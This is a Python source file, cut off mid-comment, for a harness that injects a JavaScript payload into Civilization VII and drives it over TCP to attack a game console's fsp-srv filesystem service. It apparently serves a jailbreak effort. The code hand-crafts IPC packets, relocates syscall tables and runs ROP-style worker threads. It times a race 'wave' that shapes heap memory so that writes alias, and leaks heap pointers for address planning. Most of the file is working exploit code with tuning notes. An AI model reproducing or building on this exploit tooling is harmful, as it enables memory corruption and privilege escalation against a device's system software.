"""Workstation side of the Civ VII wave harness.

Drives research/CivSwitch/harness/console.js over TCP (port 9027). Every wire format
lives here so frames can be diffed against ns2jb:

  packet / domain / control / close-object -> ns2jb engine/shared/ipc.cjs, shared/domain.cjs
  path packets                             -> ns2jb engine/switch2/memory/paths.cjs
  reservation group, counters, wave roles  -> ns2jb engine/switch2/memory/probe-reserved-gap.cjs
  filesystem bootstrap                     -> ns2jb engine/switch2/app/domain.cjs:openDomain

No wave runs unless a profile is requested explicitly, and nothing writes to the
console before the payload has been loaded with send_js.py.
"""
import hashlib
import json
import math
import os
import socket
import struct
import time
from pathlib import Path

import frames

DEFAULT_HOST = "192.168.1.215"
# A dead payload leaves its bound socket open, so the port is a per-boot resource.
# Override CIV_HARNESS_PORT to reload on a fresh port without a game restart.
CONTROL_PORT = int(os.environ.get("CIV_HARNESS_PORT", "9029"))
CONSOLE_PORT = 9026   # Remote JS Loader
RUNS = Path(__file__).with_name("runs")
SDK = json.loads((Path(__file__).with_name("..") / "relocation" / "signatures" /
                  "sdk-resolved.json").read_text())
SDK_OFFSETS = {fn["name"]: fn["offset"] for fn in SDK["functions"]}

# console.js::readFrame rejects any request frame whose JSON body exceeds 0x8000 bytes. A raw
# `write` hex string is twice the byte count, so a 0x4000-byte fill is already 0x8000 characters
# before JSON overhead and kills the control socket. Large writes are split at 0x1000 bytes
# (0x2000 hex characters) per call.
WRITE_CHUNK = 0x1000

def write_chunked(console, address, data, chunk=WRITE_CHUNK):
    data = bytes(data)
    for at in range(0, len(data), chunk):
        console.request("write", address=address + at, hex=data[at:at + chunk].hex())

# ns2jb probe-reserved-gap.cjs constants, verbatim, so qualification is comparable.
EXTENT = 0x2440
MARKER_OFFSET = 0x2340
# ns2jb pads the canary path to 0x5a0. Sweepable in byte steps so the aliasing target can be
# shifted by tens of bytes (the coarse reservation knob moves ~208 and crashes).
CANARY_SIZE = int(os.environ.get("CIV_CANARY_SIZE", "0x5a0"), 0)
# Trigger's opening sleep (ns). ns2jb uses 2400000; the fold requires the trigger's window to sit
# inside the tails' windows, so this places it relative to whatever tail delays are in use.
TRIGGER_SLEEP = int(os.environ.get("CIV_TRIGGER_SLEEP", "2400000"))
# The release worker signals `released` AFTER its sleep; guard0/guard1 wait on it and the trigger
# waits on guard1's `guard` signal, so this value places the trigger's sample. ns2jb's 2.8 ms puts
# the sample after the canary/filler finish (completedFlag=1 -> the guard aborts); pulling it in
# lets the trigger sample while the protected requests are still in flight.
RELEASE_DELAY = int(os.environ.get("CIV_RELEASE_DELAY", "2800000"))
# The canary is the earliest protected role (ns2jb: 1.7 ms) and therefore the one that does NOT
# get deferred -- but allPending needs every protected role's window to contain the trigger's, and
# the trigger's own window is ~850 us (its descriptor is the extent piece, which the FS must
# normalise). Moving the canary into the deferral-prone range widens its window instead.
CANARY_DELAY = int(os.environ.get("CIV_CANARY_DELAY", "1700000"))
# guard0/guard1 wait on `released` plus (i-10)*150000, which lands them ~1.4-1.7 ms -- before the
# busy period where roles defer. CIV_GUARD_DELAY adds to that sleep so they can join the others.
GUARD_DELAY = int(os.environ.get("CIV_GUARD_DELAY", "0"))
# ns2jb spreads the guards (i-10)*150000, which makes guard1 the LAST protected start. The trigger then
# has to land between it and the first tail end (2145 us), an 11 us slot for a 38 us window. Closing
# the spread opens that slot; CIV_TRIGGER_DEFER_CHECK still reports whether the trigger stayed fast.
GUARD_SPREAD = int(os.environ.get("CIV_GUARD_SPREAD", "150000"))
# The tails' sends complete in ~830 us whatever their delay (the FS defers the operation but replies
# 0x320002 immediately), so they can never span a deferred trigger -- the trigger has to stay fast
# and land in the slot between the last protected start and the first tail end. Both fillers therefore
# go early: ns2jb's filler1 sits at 2.15 ms, which left only a ~3 us margin for a 2.1 ms trigger.
FILLER_DELAYS = [int(x) for x in os.environ.get("CIV_FILLER_DELAYS", "2000000,2150000").split(",")]
MARKER = "SPAN_MARKER"
ABSENT = "SPAN_ABSENT"
SEGMENTS = ["S0", "S1", "S2"]
# ns2jb probeReadSize. Override per run with CIV_READ_SIZE to re-measure the geometry for
# Civ VII's filesystem, where the hole's large receive monopolises fsp-srv and delays release.
PROBE_READ_SIZE = int(os.environ.get("CIV_READ_SIZE", "0x180000"), 0)
# ns2jb's SmileBASIC-measured reservation. Civ VII measures ~12160-12176 for 59 objects rather
# than the expected 59*208 = 12272, so both the object count and the implied byte gap differ;
# CIV_RESERVE_OBJECTS lets the geometry sweep move the gap that the extent aliasing lands in.
RESERVATION_PAGES = int(os.environ.get("CIV_RESERVE_OBJECTS", "59"))
# ns2jb writeSize (probe-reserved-gap.cjs:46): the per-wave "Dirty gap commit data" write —
# 16 MB dirtied through the FS journal before EVERY wave (todo #4, round-57 ns2jb-diff).
# BOOT-51 GROUND TRUTH: the reference ran on a 16+ GB save-data target where 16 MB was
# trivial; Civ VII's save (0400000000000037, ~62.6 MB free) CANNOT hold a 16 MB file —
# CreateFile returned OutOfSpace (0x3C00) and degraded every wave this boot. The design-
# faithful port is "a file sized to the save's free margin, re-dirtied every wave" — the
# journal work, not the absolute size, is the heap-shaping point. Default scaled down to
# 1 MB (~1.6 pct of the 62 MB free margin); CIV_COMMIT_DATA_SIZE overrides.
COMMIT_WRITE_SIZE = int(os.environ.get("CIV_COMMIT_DATA_SIZE", "0x100000"), 0)
RESERVATION_BYTES = RESERVATION_PAGES * 208
COUNT_OBJECTS = 1009
CREATE_OBJECTS = 1200

u32 = lambda v: struct.pack("<I", v & 0xffffffff)
u64 = lambda v: struct.pack("<Q", v)


def load_console(host, settle=4.0):
    """Send console.js to the Remote JS Loader (port 9026).

    The loader evaluates one payload per boot, so the relocation payload must be
    unloaded first (relocation/host/relocate_host.py <ip> stop) or the game restarted.
    """
    code = Path(__file__).with_name("console.js").read_text()
    # Bind the port chosen for this load, so a leaked port never blocks a reload.
    code = code.replace("const CONTROL_PORT = 9029;", "const CONTROL_PORT = %d;" % CONTROL_PORT)
    probe = socket.create_connection((host, CONSOLE_PORT), timeout=8)
    probe.sendall(code.encode())
    probe.shutdown(socket.SHUT_WR)
    probe.settimeout(settle)
    seen = b""
    try:
        while True:
            chunk = probe.recv(65536)
            if not chunk:
                break
            seen += chunk
    except socket.timeout:
        pass
    probe.close()
    print(seen.decode("utf-8", "replace")[-3000:])
    print("console.js sent; harness control should be live on :%d" % CONTROL_PORT)
    return seen.decode("utf-8", "replace")


def descriptor(buffer):
    address, size = buffer["address"], buffer["size"]
    mode = buffer.get("mode", 0)
    assert address < 1 << 39 and size < 1 << 36 and mode in (0, 1, 3), "Invalid map-alias descriptor"
    high = mode | (address >> 36) << 2 | (size >> 32) << 24 | ((address >> 32) & 15) << 28
    return struct.pack("<III", size & 0xffffffff, address & 0xffffffff, high & 0xffffffff)


def packet(command, input=b"", *, pid=False, copies=(), send=(), receive=()):
    assert len(copies) <= 15 and len(send) <= 15 and len(receive) <= 15, "Too many descriptors"
    buf = bytearray(256)
    special = pid or len(copies) > 0
    struct.pack_into("<I", buf, 0, (4 | len(send) << 20 | len(receive) << 24) & 0xffffffff)
    struct.pack_into("<I", buf, 4, (math.ceil((32 + len(input)) / 4) | (0x80000000 if special else 0)) & 0xffffffff)
    at = 8
    if special:
        struct.pack_into("<I", buf, at, (1 if pid else 0) | len(copies) << 1)
        at += 4
        if pid:
            at += 8
        for handle in copies:
            struct.pack_into("<I", buf, at, handle)
            at += 4
    for buffer in [*send, *receive]:
        buf[at:at + 12] = descriptor(buffer)
        at += 12
    at = (at + 15) & ~15
    assert at + 16 + len(input) <= len(buf), "CMIF input exceeds packet capacity"
    buf[at:at + 4] = b"SFCI"
    struct.pack_into("<I", buf, at + 8, command)
    buf[at + 16:at + 16 + len(input)] = input
    return bytes(buf)


def data_start(buf):
    first, second = struct.unpack_from("<II", buf, 0)
    at = 8
    if second >> 31:
        special = struct.unpack_from("<I", buf, at)[0]
        at += 4 + (8 if special & 1 else 0)
        at += 4 * ((special >> 1 & 15) + (special >> 5 & 15))
    at += (first >> 16 & 15) * 8
    at += ((first >> 20 & 15) + (first >> 24 & 15) + (first >> 28 & 15)) * 12
    return (at + 15) & ~15


def path_packet(command, entry, input=b"", descriptors=None):
    """ns2jb memory/paths.cjs pathPackets: inline 8-byte path descriptors."""
    entries = descriptors or [{"address": entry["address"], "size": entry["size"]}]
    assert 0 < len(entries) <= 2, "Invalid path descriptor count"
    original = packet(command, input)
    buf = bytearray(256)
    buf[:8] = original[:8]
    struct.pack_into("<I", buf, 0, 4 | len(entries) << 16)
    at = 8
    for index, item in enumerate(entries):
        assert 0 < item["size"] <= 0x800, "Invalid path descriptor size"
        address = item["address"]
        struct.pack_into("<I", buf, at, index | item["size"] << 16 | (address >> 36 & 7) << 6 | (address >> 32 & 15) << 12)
        struct.pack_into("<I", buf, at + 4, address & 0xffffffff)
        at += 8
    at = (at + 15) & ~15
    buf[at:at + 16 + len(input)] = original[16:16 + 16 + len(input)]
    return bytes(buf)


def domain(object_id, command, input=b"", *, context=0, send=(), receive=(), pid=False, copies=()):
    """ns2jb shared/domain.cjs wire.domain: object framing plus optional context."""
    buf = bytearray(packet(command, input, pid=pid, copies=copies, send=send, receive=receive))
    at = data_start(buf)
    if object_id is not None:
        buf[at + 16:at + 32 + len(input)] = buf[at:at + 16 + len(input)]
        buf[at:at + 16] = b"\0" * 16
        buf[at] = 1
        struct.pack_into("<H", buf, at + 2, 16 + len(input))
        struct.pack_into("<I", buf, at + 4, object_id)
        struct.pack_into("<I", buf, at + 12, context)
        struct.pack_into("<I", buf, at + 20, 1 if context else 0)
        struct.pack_into("<I", buf, 0, struct.unpack_from("<I", buf, 0)[0] & 0xffff0000 | (6 if context else 4))
        struct.pack_into("<I", buf, 4, struct.unpack_from("<I", buf, 4)[0] + 4)
    else:
        struct.pack_into("<I", buf, 0, 7 if context else 5)
        struct.pack_into("<I", buf, at + 4, 1 if context else 0)
        struct.pack_into("<I", buf, at + 12, context)
    return bytes(buf)


def control(command, input=b"", *, context=0, send=(), receive=()):
    buf = bytearray(packet(command, input, send=send, receive=receive))
    at = data_start(buf)
    struct.pack_into("<I", buf, 0, 7 if context else 5)
    struct.pack_into("<I", buf, at + 4, 1 if context else 0)
    struct.pack_into("<I", buf, at + 12, context)
    return bytes(buf)


def close_object(object_id, context=0):
    """ns2jb shared/domain.cjs wire.closeObject: no SFCI, no path descriptor."""
    buf = bytearray(256)
    struct.pack_into("<I", buf, 0, 6 if context else 4)
    struct.pack_into("<I", buf, 4, 8)
    buf[16] = 2
    struct.pack_into("<I", buf, 20, object_id)
    struct.pack_into("<I", buf, 28, context)
    return bytes(buf)


def normalized_path(prefix, length):
    """ns2jb memory/normalized-path.cjs: build an already-normalised MISSING path.

    Pads with `/<up to 32 A's>` chunks until exactly `length` characters. ns2jb stages the canary
    and guard paths this way; the harness previously wrote only the short path and merely declared
    the size, so the filesystem saw a different (and existing) path.
    """
    assert prefix.startswith("/") and "//" not in prefix and not prefix.endswith("/"), \
        "invalid normalized path prefix"
    assert len(prefix) <= length, "prefix longer than the requested length"
    text = prefix
    while len(text) < length:
        remaining = length - len(text)
        text += "A" if remaining == 1 else "/" + "A" * min(32, remaining - 1)
    return text


def context_bytes(buf, value):
    """ns2jb probe-reserved-gap.cjs local context(): sequential (9) or concurrent (3)."""
    buf = bytearray(buf)
    at = data_start(buf)
    struct.pack_into("<I", buf, 0, struct.unpack_from("<I", buf, 0)[0] & 0xFFFF0000 | 6)
    struct.pack_into("<I", buf, at + 4, 1)
    struct.pack_into("<I", buf, at + 12, value)
    return bytes(buf)


def parse_reply(buf, *, domain_reply=False, data_size=0):
    # The console returns reply buffers as hex strings; accept bytes too.
    buf = bytes.fromhex(buf) if isinstance(buf, str) else bytes(buf)
    first, second = struct.unpack_from("<II", buf, 0)
    at = 8
    copies, moves = [], []
    if second >> 31:
        special = struct.unpack_from("<I", buf, at)[0]
        at += 4
        if special & 1:
            at += 8
        for _ in range(special >> 1 & 15):
            copies.append(struct.unpack_from("<I", buf, at)[0])
            at += 4
        for _ in range(special >> 5 & 15):
            moves.append(struct.unpack_from("<I", buf, at)[0])
            at += 4
    at += (first >> 16 & 15) * 8
    at += ((first >> 20 & 15) + (first >> 24 & 15) + (first >> 28 & 15)) * 12
    at = (at + 15) & ~15

    if not domain_reply:
        assert buf[at:at + 4] == b"SFCO", "Missing SFCO reply"
        result = struct.unpack_from("<I", buf, at + 8)[0]
        return {"result": result, "canonical": result & 0x3FFFFF, "copies": copies, "moves": moves,
                "objects": [], "data": buf[at + 16:]}

    count = struct.unpack_from("<I", buf, at)[0]
    result = struct.unpack_from("<I", buf, at + 24)[0]
    object_start = at + 32 + data_size
    assert object_start <= len(buf), "Invalid domain reply extent"
    assert not result or count <= (len(buf) - object_start) // 4, "Invalid domain reply extent"
    flat = bytearray(buf)
    flat[at:len(buf) - 16] = buf[at + 16:]
    parsed = parse_reply(flat)
    objects = [struct.unpack_from("<I", buf, object_start + 4 * i)[0] for i in range(count)] if not parsed["result"] else []
    return {**parsed, "objects": objects, "data": parsed["data"][:data_size]}


class Console:
    """Length-prefixed JSON client for the console side of the harness."""

    def __init__(self, host=DEFAULT_HOST, port=CONTROL_PORT, timeout=60):
        self.socket = socket.create_connection((host, port), timeout)
        self.id = 0

    @staticmethod
    def _jsonable(value):
        if isinstance(value, (bytes, bytearray)):
            return value.hex()
        if isinstance(value, dict):
            return {k: Console._jsonable(v) for k, v in value.items()}
        if isinstance(value, (list, tuple)):
            return [Console._jsonable(v) for v in value]
        return value

    def _send(self, value):
        body = json.dumps(self._jsonable(value)).encode()
        self.socket.sendall(struct.pack("<I", len(body)) + body)

    def _exactly(self, size):
        out = b""
        while len(out) < size:
            chunk = self.socket.recv(size - len(out))
            if not chunk:
                raise OSError("Control connection closed")
            out += chunk
        return out

    def _receive(self):
        size = struct.unpack("<I", self._exactly(4))[0]
        if size <= 0 or size > 0x100000:
            raise OSError("Bad frame size " + str(size))
        return json.loads(self._exactly(size))

    def request(self, command, **fields):
        self.id += 1
        # The console takes packet/hex fields as hex strings; callers pass bytes.
        fields = {key: (value.hex() if isinstance(value, (bytes, bytearray)) else value)
                  for key, value in fields.items()}
        self._send({"id": self.id, "command": command, **fields})
        reply = self._receive()
        if "error" in reply:
            raise RuntimeError(reply["error"] + "\n" + reply.get("stack", ""))
        return reply

    def close(self):
        self.socket.close()


class Harness:
    def __init__(self, host=DEFAULT_HOST, port=CONTROL_PORT, scratch_prefix="/CIV_GAP"):
        self.console = Console(host, port)
        self.scratch_prefix = scratch_prefix
        self.scratch = scratch_prefix + "_" + str(int(time.time()))
        self.paths = {}
        self.state = {}
        self.prepare()

    def prepare(self):
        """Push the decoded SVC table and SDK relocation into the console payload.

        The console cannot scan for these itself: most syscall stubs are not
        `svc; ret`, and the raw named-port SVC is refused in compat mode.
        """
        # The payload's state persists across connections, so the relocation only needs doing
        # once. Re-running it calls call_rop (applyRelocation -> calibrate does two ticks plus a
        # 200 ms sleep), and repeated relocations are what precede the payload going silent on
        # later connections -- so skip when it is already applied.
        if self.console.request("status").get("ok"):
            return
        base = Path(__file__).resolve().parent.parent / "relocation" / "signatures"
        try:
            svc = json.loads((base / "svc-relocation.json").read_text())
            self.console.request("setSvcTable", entries=svc["entries"])
        except FileNotFoundError:
            pass
        try:
            sdk = json.loads((base / "sdk-relocation.json").read_text())
            self.console.request("setFunctions", entries=sdk["functions"])
        except FileNotFoundError:
            pass
        # Apply the pushed tables; without this every call reports "wrapper missing".
        self.console.request("relocate")

    def stage(self, name, text, size=None):
        """Place a path string in a console page and remember where it lives."""
        payload = (text + "\0").encode()
        assert len(payload) < 0x800, "Path exceeds descriptor limit"
        entry = {"address": self.console.request("alloc", pages=1)["address"], "size": size or len(payload)}
        padded = payload + b"\0" * (-len(payload) % 4)
        self.console.request("write", address=entry["address"], hex=padded.hex())
        entry["payload"] = padded   # recorded for CIV_STAGE_SWAP rewrites (byte-faithful)
        self.paths[name] = entry
        return entry

    def swap_staged_pages(self, x, y):
        """CIV_STAGE_SWAP: exchange two staged paths' payload-heap ADDRESSES.

        Round-48 diagnosis: the aliased write lands on held-path staged pages
        (94% fillers+guards, 6% canary across 17 landing events) while the client
        slot (b29 swap) and timing (window holds every draw) are both excluded —
        the remaining variable is WHERE the canary's path text sits in the payload
        heap. This swaps the staged page contents between two paths and exchanges
        their entry addresses: every packet still describes byte-identical data
        (each entry's text is rewritten into the other's page, sizes stay with
        their own texts), but the canary's path bytes now live at the landing-prone
        page. If canary landings rise to the filler/guard rate, Stage A is
        structural; if landings stay on fillers/guards, the landing follows
        FS-side allocation order, not the payload heap (SM3 planner territory).
        """
        pa, pb = self.paths[x], self.paths[y]
        for entry, other_addr in ((pa, pb["address"]), (pb, pa["address"])):
            payload = entry.get("payload")
            assert payload is not None, "stage-swap needs the recorded payload: %r" % entry
            data = bytes(payload) + b"\0" * max(0, entry["size"] - len(payload))
            assert len(data) <= 0x1000, "stage-swap page overflow: %d" % len(data)
            self.console.request("write", address=other_addr, hex=data.hex())
        pa["address"], pb["address"] = pb["address"], pa["address"]
        print("stage-swap: %s <-> %s (payload-heap addresses exchanged)" % (x, y), flush=True)

    def open_domain(self, label):
        """ns2jb app/domain.cjs openDomain: named port, Initialize, ConvertToDomain."""
        opened = self.console.request("open", name="fsp-srv")
        assert not opened["result"], label + ": fsp-srv unreachable (" + str(opened["result"]) + ")"
        handle = opened["handle"]
        initialize = parse_reply(self.console.request("send", handle=handle, packet=packet(1, u64(0), pid=True))["hex"])
        assert not initialize["result"], label + ": FS initialization failed " + str(initialize["result"])
        converted = parse_reply(self.console.request("send", handle=handle, packet=control(0))["hex"])
        assert not converted["result"], label + ": domain conversion failed " + str(converted["result"])
        self.state[label] = {"handle": handle, "root": struct.unpack("<I", converted["data"][:4])[0]}
        return self.state[label]

    def clone(self, label):
        state = self.state[label]
        reply = parse_reply(self.console.request("send", handle=state["handle"], packet=control(2))["hex"])
        assert not reply["result"] and len(reply["moves"]) == 1, "Clone failed " + str(reply["result"])
        return reply["moves"][0]

    def open_session(self, label):
        """A plain initialised fsp-srv session: counters and storages live here."""
        handle = self.console.request("open", name="fsp-srv")["handle"]
        init = parse_reply(self.console.request("send", handle=handle,
                                                packet=packet(1, u64(0), pid=True).hex())["hex"])
        assert not init["result"], label + ": FS initialization failed " + str(init["result"])
        return handle

    def cached_session(self, key, label):
        """One initialised fsp-srv session per payload, reused across wave attempts.

        The retry loop opened SIX fresh fsp-srv sessions per attempt (counters, wave-root,
        churn-a/b, after) — ns2jb's in-process wave() rides one shared session plus one new
        domain per retry. fsp-srv caps concurrent sessions per process, so by attempt 3 the
        getService blocked inside the payload's single-threaded server and the console froze
        (the "third rereserve hangs" pattern, reproduced on every boot since multi-attempt
        retries worked). The mounted/root sessions are independent of the reservation, so
        caching them is behaviour-neutral; a failed liveness probe reopens transparently.
        """
        handle = self.state.get(key)
        if handle:
            try:
                self.counters(handle)                # cheap liveness probe
                return handle
            except Exception:
                self.state[key] = None
        handle = self.open_session(label)
        self.state[key] = handle
        return handle

    def counters(self, handle):
        """GetSaveDataAllocationInfo (1009) is a plain command on the session, not a domain request."""
        reply = parse_reply(self.console.request("send", handle=handle,
                                                 packet=packet(COUNT_OBJECTS).hex())["hex"])
        assert not reply["result"], "Allocation counters failed: " + str(reply["result"])
        return [struct.unpack_from("<Q", reply["data"], 8 * i)[0] for i in range(16)]

    def leak_read(self, blocks=8, label="leak"):
        """Read the reserved gap's own content storage back through fsp-srv — ns2jb's native
        cache-read stage (fs-memory-control.cjs), the measurement the address planner needs.

        Opens the content storage on the reserved root (command 200, exactly as the wave's
        commit role does), GetSize (4), then reads BLOCK-aligned 0x4000 blocks with IStorage
        Read (806: u64 offset, u64 size, receive descriptor). The returned bytes ARE the
        cache's heap contents around where the wave's pieces/requests land: aligned 39-bit
        pointers found inside them are the alias-address candidates for signed-cache-plan
        (findNativeLinks.cjs logic, inline). Pure reads: no wave, no overwrite, no aborts.
        """
        # Host state is per-process: reserve within THIS invocation (the console-side setup
        # persists, but outer/counters live in the driving process only).
        if not self.state.get("outer"):
            self.setup(reserve=True)
        root = self.cached_session("wave_root_handle", "wave-root")
        opened = parse_reply(self.console.request("send", handle=root, packet=packet(200).hex())["hex"])
        assert not opened["result"] and opened["moves"], "storage open failed: " + str(opened["result"])
        storage = opened["moves"][0]
        size = parse_reply(self.console.request("send", handle=storage, packet=packet(4).hex())["hex"])
        assert not size["result"], "storage GetSize failed"
        storage_size = struct.unpack_from("<Q", size["data"], 0)[0]
        block = 0x4000
        addresses = {}
        dumps = []
        # ONE reusable rx_page (allocating inside the loop leaked 16 KB per block), poisoned
        # before each IPC so unchanged bytes are detectable. CRITICAL (pass-5 review): the DMA
        # lands in the Type-B receive descriptor's console buffer (rx_page), NOT in the inline
        # TLS reply — the reply's trailing 224 bytes are outbound-request residue (the earlier
        # dumps were exactly that; SHA diffs were our own u64 offsets echoing back). Read the
        # buffer back through the console's read command after the IPC returns.
        rx_page = self.console.request("alloc", pages=block // 0x1000)["address"]
        poison = b"\xa5" * block
        for index in range(blocks):
            offset = index * block
            # Re-poison before EVERY block: rx_page is reused, so a shorter or failed DMA on one
            # block would otherwise leave the previous block's bytes to masquerade as fresh data.
            # Chunked: a 0x4000-byte fill is exactly 0x8000 hex chars and overflows the console's
            # 0x8000 request-frame cap.
            write_chunked(self.console, rx_page, poison)
            # IStorage::Read is command 0 (libnx fssrv; ns2jb reads with s.ipc(..., 0, ...) —
            # command 806 echoed the request back instead of replying).
            read = parse_reply(self.console.request("send", handle=storage,
                packet=packet(0, u64(offset) + u64(block),
                              receive=[{"address": rx_page, "size": block, "mode": 1}]).hex())
                ["hex"])
            if read["result"]:
                addresses["0x%x" % offset] = {"error": read["result"]}
                continue
            data = bytes.fromhex(self.console.request("read", address=rx_page, length=block)["hex"])
            poison_left = data.count(0xa5)
            if poison_left == block:
                addresses["0x%x" % offset] = {"error": "read did not DMA (all poison)"}
                continue
            file = RUNS / ("%s-%s-block%02d.bin" % (label, self.state.get("stamp") or "x", index))
            file.write_bytes(data)
            dumps.append({"offset": offset, "file": str(file.name),
                          "sha256": __import__("hashlib").sha256(data).hexdigest(),
                          "poisonLeft": poison_left})
            # findNativeLinks (ns2jb native-links.cjs): ONLY 0x4000 block heads qualify, with
            # zeroTail/zeroAfter32 strength signals — not every 8-byte word.
            for head in range(0, len(data) - 8, block):
                value = struct.unpack_from("<Q", data, head)[0]
                if not (0x100000000 <= value < (1 << 39) and value % block == 0 and value & 0xffffff):
                    continue
                zeroTail = not any(data[head + 8:head + 64])
                zeroAfter32 = not any(data[head + 32:head + block])
                addresses.setdefault("0x%x" % offset, []).append(
                    {"at": head, "target": "0x%x" % value, "zeroTail": zeroTail,
                     "zeroAfter32": zeroAfter32})
        # Close the storage with the CMIF Close (control 2) protocol, not raw svcCloseHandle —
        # ns2jb closes IPC objects properly (s.close sends Close before the handle svc).
        try:
            close = parse_reply(self.console.request("send", handle=storage,
                                                     packet=control(2).hex())["hex"])
        except Exception:
            pass
        return {"storageSize": storage_size, "blocks": dumps, "candidates": addresses}

    def reserve_group(self, label):
        """ns2jb reserveGroupAttempt: 59 group objects, measured allocation cost, wrapped outer."""
        trace = os.environ.get("CIV_RESERVE_TRACE")
        def note(step, **extra):
            if trace:
                print("reserve[%s] %s %s" % (label, step, extra or ""), flush=True)
        note("open counters session")
        counters = self.cached_session("counters_handle", label + "-counters")
        note("open owner domain")
        state = self.open_domain(label + "-owner")
        # CopyObject(owner.root) first, then create, then wrap. ns2jb's order.
        root_copy = parse_reply(self.console.request("send", handle=state["handle"],
            packet=control(1, u32(state["root"])).hex())["hex"])
        assert not root_copy["result"] and root_copy["moves"], "root copy failed"
        note("root copy ok", handle=state["handle"])
        before = self.counters(counters)
        # ns2jb sends wire.domain(root, 1200) with NO context, synchronously.
        objects = []
        for index in range(RESERVATION_PAGES):
            reply = parse_reply(self.console.request("send", handle=state["handle"],
                packet=domain(state["root"], CREATE_OBJECTS).hex())["hex"],
                domain_reply=True, data_size=0)
            assert not reply["result"] and len(reply["objects"]) == 1, \
                "Manager reservation %d failed: 0x%x" % (index, reply["result"])
            objects.append(reply["objects"][0])
        note("59 manager objects created")
        held = self.counters(counters)
        allocated = before[5] - held[5]
        outer = None
        # ns2jb gates on allocated == 12272; Civ VII measures 12160 (firmware difference),
        # so wrap on any positive reservation and record the measured cost.
        if allocated > 0:
            converted = parse_reply(self.console.request("send", handle=state["handle"],
                                                        packet=control(0).hex())["hex"])
            assert not converted["result"], "Group wrapping failed"
            outer = struct.unpack("<I", converted["data"][:4])[0]
        note("wrapped", allocated=allocated, outer=outer)
        return {"handle": state["handle"], "root": state["root"], "rootCopy": root_copy["moves"][0],
                "outer": outer, "before": before, "held": held, "allocated": allocated,
                "expected": RESERVATION_BYTES, "matches": allocated == RESERVATION_BYTES,
                "objects": objects}

    def post_test(self):
        """Validate the async substrate: setup the mounted FS, then post benign
        counter requests and collect them. No heap shaping."""
        self.setup()
        session = self.open_session("posttest")
        posted = []
        for index in range(3):
            posted.append(self.console.request("post", handle=session,
                                               packet=packet(COUNT_OBJECTS).hex(), label="c%d" % index))
        waits = [self.console.request("collect", index=index) for index in range(len(posted))]
        replies = []
        for wait in waits:
            entry = {"hex64": wait["hex"][:128]}
            try:
                reply = parse_reply(wait["hex"])
                entry.update(result=reply["result"], canonical=reply["canonical"], data=reply["data"][:16].hex())
            except Exception as exc:                        # noqa: BLE001
                entry["parseError"] = str(exc)
            replies.append(entry)
        return {"posts": [{k: p.get(k) for k in ("result", "event", "index")} for p in posted],
                "replies": replies}

    def gate_test(self):
        """Validate the event gates: initialize -> signal -> tryWait -> clear -> tryWait.

        These four are non-blocking, so they run on the payload thread via call_rop and
        confirm the resolved offsets and the manual-reset semantics from events.cjs:
        initialize leaves byte0=0, byte1=1, u32@4=0; signal makes tryWait return 1;
        clear returns it to 0. `wait` blocks and is exercised separately in a worker.
        """
        sdk = self.console.request("status")["sdkBase"]
        gate = self.console.request("alloc", pages=1)["address"]
        self.console.request("write", address=gate, hex="00" * 16)

        def invoke(name, *args):
            return int(self.console.request("call", address=sdk + SDK_OFFSETS[name],
                                            args=list(args))["result"])

        result = {"gate": gate}
        result["initialize"] = invoke("initialize", gate, 0, 0)
        result["afterInitialize"] = self.console.request("read", address=gate, length=8)["hex"]
        result["signal"] = invoke("signal", gate, 0, 0)
        result["tryWaitSignaled"] = invoke("tryWait", gate, 0, 0)
        result["clear"] = invoke("clear", gate, 0, 0)
        result["tryWaitCleared"] = invoke("tryWait", gate, 0, 0)
        return result

    def _read_slots(self, base, proof):
        return [struct.unpack("<Q", bytes.fromhex(self.console.request(
            "read", address=base + off, length=8)["hex"]))[0] for off in proof["resultOffsets"]]

    def gate_worker(self):
        """Validate blocking `wait` in a worker: the thread waits on a gate the host signals.

        The frame is [wait(gate), tick]. Until the host signals, the second result slot must
        stay SENTINEL (the thread is parked); after signal(gate) the tick runs and the slot is
        written. This is the worker<->gate handshake every wave step is built from.
        """
        sdk = self.console.request("status")["sdkBase"]
        gate = self.console.request("alloc", pages=1)["address"]
        self.console.request("write", address=gate, hex="00" * 16)
        self.console.request("call", address=sdk + SDK_OFFSETS["initialize"], args=[gate, 0, 0])
        calls = [{"function": sdk + SDK_OFFSETS["wait"], "args": [gate, 0, 0, 0]},
                 {"function": sdk + SDK_OFFSETS["tick"], "args": [0, 0, 0, 0]}]
        base, proof = self._launch_frame(calls)
        time.sleep(0.4)
        before = self._read_slots(base, proof)
        self.console.request("call", address=sdk + SDK_OFFSETS["signal"], args=[gate, 0, 0])
        after = self._poll_results(base, proof)
        return {"gate": gate, "slotsWhileWaiting": before,
                "parkedWhileWaiting": before[-1] == frames.SENTINEL,
                "slotsAfterSignal": after, "wokeOnSignal": after[-1] != frames.SENTINEL}

    def worker_send(self):
        """Validate the worker IPC step: a thread sends a real FS request and gets the reply.

        The frame is a single `send(page, 0x1000, handle)` where page holds a benign counter
        packet. On success the SVC returns 0 and the FS overwrites the page with the SFCO
        reply, which is exactly how every wave role step works.
        """
        sdk = self.console.request("status")["sdkBase"]
        handle = self.open_session("worker-send")
        page = self.console.request("alloc", pages=1)["address"]
        self.console.request("write", address=page, hex=(packet(COUNT_OBJECTS) + b"\0" * 64).hex())
        calls = [{"function": sdk + SDK_OFFSETS["send"], "args": [page, 0x1000, handle, 0]}]
        base, proof = self._launch_frame(calls)
        slots = self._poll_results(base, proof)
        raw = self.console.request("read", address=page, length=256)["hex"]
        reply = parse_reply(bytes.fromhex(raw))
        values = [struct.unpack_from("<Q", reply["data"], 8 * i)[0] for i in range(4)]
        return {"session": handle, "sendResult": slots[0], "replyResult": reply["result"],
                "replyCanonical": reply["canonical"], "firstCounters": values}

    def _launch_frame(self, calls, core=None):
        """Build, allocate, write, create, start (and optionally pin) one worker frame.

        Returns (base, proof). ns2jb pins every worker with pthread_setaffinity_np so the 13
        threads do not scatter across cores; without it the wave's timings swing by milliseconds.
        On Civ VII that is available as SVC 0x11 (SetThreadCoreMask), no SDK relocation needed.
        """
        sdk = self.console.request("status")["sdkBase"]
        code = {name: SDK_OFFSETS[name] for name in ("loadTable", "call4", "saveResult64", "exit", "memcpy")}
        _, shape = frames.build(0, sdk, calls, code)
        base = self.console.request("alloc", pages=shape["bytes"] // 0x1000)["address"]
        frame, proof = frames.build(base, sdk, calls, code)
        for at in range(0, len(frame), 0x1000):
            page = frame[at:at + 0x1000]
            if any(page):
                self.console.request("write", address=base + at, hex=page.hex())
        out = self.console.request("alloc", pages=1)["address"]
        # svcCreateThread's last argument is `cpuid`, the thread's ideal core. Passing it at
        # creation is the reliable way to spread/pin the workers here: SetThreadCoreMask's
